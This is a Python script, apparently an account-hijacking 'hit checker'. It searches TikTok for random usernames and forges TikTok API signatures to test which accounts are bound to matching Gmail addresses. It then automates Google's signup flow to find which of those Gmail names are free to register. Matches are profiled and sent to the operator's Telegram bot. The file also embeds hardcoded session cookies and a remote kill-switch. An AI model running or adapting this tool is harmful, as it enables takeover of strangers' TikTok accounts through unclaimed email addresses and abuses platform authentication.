from requests import Session
import secrets
import uuid
import time
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import requests
import random
from uuid import uuid4
import requests
from time import time
import os
from user_agent import *
import http.client
import re
from random import randrange,choice,randint
from threading import Thread
from ms4 import InfoTik
from cfonts import render

logo = render('Ilyass', font='block', colors=['yellow', 'cyan'], align='center', space=True)

border = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
print('\033[1m' + border)
print('\033[1m'+logo)
print('\033[1m' + border)
print('\n'*1)

ID = input('\x1b[38;5;153m' + '\033[1m' + 'Your Id Here:   ')
token = input('\n'+'\x1b[38;5;141m' + '\033[1m' + 'Your token Here:   ');print('\n')

os.system('clear')
print('\033[1m' + border)
print('\033[1m'+logo)
print('\033[1m' + border)
print('\n'*1)

badgmail = 0
badtik = 0
goodtik = 0
hits = 0

aa = requests.get('https://pastebin.com/raw/uh7YtXjq').text

if aa == 'ILYAS':
	pass
else:
	print('Stopped')
	exit()

def info(userr):
	
	tiko = InfoTik.TikTok_Info(userr)
	if 'bad' in tiko['status']:
	 print(' - Bad Username ..!')
	elif 'ok' in tiko['status']:
	 try:
	  Name = tiko['name']
	 except:
	  Name = 'None'
	 try:
	  Followers = tiko['followers']
	 except:
	  Followers = 'None'
	 try:
	  Following = tiko['following']
	 except:
	  Following = 'None'
	 try:
	  Like = tiko['like']
	 except:
	  Like = 'None'
	 try:
	  Video = tiko['video']
	 except:
	  Video = 'None'
	 try:
	  Flag = tiko['flag']
	 except:
	  Flag = 'None'
	 try:
	  Country = tiko['country']
	 except:
	  Country = 'None'
	 try:
	  Date = tiko['Date']
	 except:
	  Date = 'None'
	 try:
	  Id = tiko['id']
	 except:
	  Id = 'None'
	 try:
	  Bio = tiko['bio']
	 except:
	  Bio = 'None'
	 ff = f'''
	 𝗛𝗜𝗧 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗧𝗜𝗞𝗧𝗢𝗞
	— — — — — — — — — — — — —
	- Username : {userr}
	- Email : {userr}@gmail.com
	- Name : {Name}
	- Followers : {Followers}
	- Following : {Following}
	- Likes : {Like}
	- Video : {Video}
	- Flag : {Flag}
	- Country : {Country}
	- Date : {Date}
	- Id : {Id}
	- Bio : {Bio}
	— — — — — — — — — — — — —
	- By @FF5UU - @N1z1N
	''';print(ff)
	requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	
def play():
	os.system('clear' if os.name =='posix' else 'cls')
	print('\033[1m' + border)
	print('\033[1m'+logo)
	print('\033[1m' + border)
	print(f'          \x1b[1;38;5;46mhits: {hits}\x1b[0m | \x1b[1;38;5;196mbadgmail: {badgmail}\x1b[0m | \033[1m\033[1;38;5;32mgoodtik: {goodtik}\x1b[0m | \x1b[1;38;5;21mbadtik: {badtik}\x1b[0m')

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
    if not unix:
        unix = int(time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
    }

def check2(email):
          global goodtik, badtik
    
          try:
          	secret = secrets.token_hex(16)
          	session = requests.Session()
          	new_uuid = str(uuid.uuid4()).replace('-', '')    
          	sid_tt = f"sid_tt={new_uuid[:16]}; "
          	sessionid = f"6632dc7e2ae6354978be6f02f13789b5"
          	cookies = {
          	"passport_csrf_token": secret,                            
          	"passport_csrf_token_default": secret,
          	"sessionid":sessionid,
          	}          	
          	session.cookies.update(cookies)          	
          	params = {
                         	'passport-sdk-version': "6030790",
                         	'iid': str(random.randint(1, 10**19)),
                         	'device_id': str(random.randint(1, 10**19)),
                         	'ac': "WIFI",
                             'channel': "googleplay",
                             'aid': "1233",
                             'app_name': "musical_ly",
                             'version_code': "360505",
                             'version_name': "36.5.5",
                             'device_platform': "android",
                             'os': "android",
          	}
     
          	mkk = sign(params=urlencode(params), payload="", cookie="")          	
          	headers = {
                             'User-Agent': 'com.zhiliaoapp.musically/2023208030 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.4-tiktok)',
                             'x-tt-passport-csrf-token': secret,
                             'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
                             'x-argus': mkk["x-argus"],
                             'x-gorgon': mkk["x-gorgon"],
                             'x-khronos': mkk["x-khronos"],
                             'x-ladon': mkk["x-ladon"],
    }
         
          	response = session.post("https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/",params=params, headers=headers, data={"email":email})
          	if "Email is linked to another account. Unlink or try another email" in response.text:
          	       goodtik+=1
          	       play()
          	       check_gmail(email)
          	else:
          	       badtik+=1
          	       play()
          except Exception as e:''

def gg00():
        ua=str(generate_user_agent())
        time0=time()
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('\n')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                po=0
                for i in tok:
                    po+=1
                    if 'SNlM0e' == i:
                        break
                hl=tok[0]
                s1=tok[29]
                at=tok[po]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQbuiwLQLEbJLFMSlolNVvrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwiGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZRdDgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxo3Gdlx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHj4LTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=time()-time0
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    'time_get_tokens':tm,
                    'time':time(),
                    'by':'@Qredes - https://t.me/Qredes_Tools'
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'by':'@Qredes - https://t.me/Qredes_Tools',
                    'time':time(),
                    'time_get_tokens':tm,
                },
            }

  
def check_gmail(email):
        global hits,badgmail
      
        try:
          if '@' in email:email=email.split('@')[0]
          o=gg00()['tokens']
          TL=o['TL']
          __Host_GAPS=o['__Host-GAPS']
          at=o['at']
          hl=o['hl']
          s1=o['s1']
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = requests.post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            hits+=1
            play()
            userr = email.split('@')[0]
            info(userr)
          else:
            badgmail+=1
            play()
        except Exception as e:''
        
iko = input('\033[1m\033[1m\033[1;38;5;32m' + '1 - From 0 followers \n2 - From 400 followers\n\n- Choice:  ')
        
def rrandom():
 while True:
  try:
    keyword = ''.join(random.choice('123456780') for _ in range(10))
    kill = random.choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'אבגדהוזחטיכלמנסעפצקרשת',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )        		


      
    key = ''.join((random.choice(kill) for _ in range(random.randrange(3, 15))))
    rng = int("".join(random.choice("6789") for _ in range(1)))
        
    name = "".join(random.choice("1234567890qwertyuiopasdfghjklzxcvbnm.") for _ in range(rng))
    usery = random.choice([name, key])      	
    he3 = {
        'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 12; ar; TECNO BF6; Build/SP1A.210812.001; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",
    }
    
    ttwid = requests.get('https://www.tiktok.com/', headers=he3).cookies.get_dict().get('ttwid', '')
    
    zaid = requests.get(
            'https://www.tiktok.com/api/search/user/full/',
            headers=he3,
            params={
                'aid': '1988',
                'keyword': 'zaid' ,
                'app_name': 'tiktok_web',
                'region': 'IQ',
                'msToken':'qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh'
            }
        )
    
    msToken = zaid.cookies.get_dict().get('msToken', '')

    params = {
        '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
        'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD'
    }
    
    ses = str(uuid4()).replace('-', '')
    cookies = {
            
            'cookie': f'''passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid=''' + ttwid + '; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken=' + msToken + '; msToken=' + msToken + '; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt' }
    url = f'''https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&keyword={usery}'''
    response = requests.get(url, params=params, headers=he3, cookies=cookies).json()
    
    for users in response.get('user_list', []):
        user = users['user_info']['unique_id']
        if '_' in user:
                pass
        
        if iko == '1':
          email = user + '@gmail.com'
          check2(email)
        elif iko == '2':
           fol = users['user_info']['follower_count']
           if int(fol) >= 400:
            email = user + '@gmail.com'
            check2(email)
        else:
        	print('Whaaaaaaaaaat')
        	exit()
  except:''

for _ in range (6):
	Thread(target=rrandom).start()
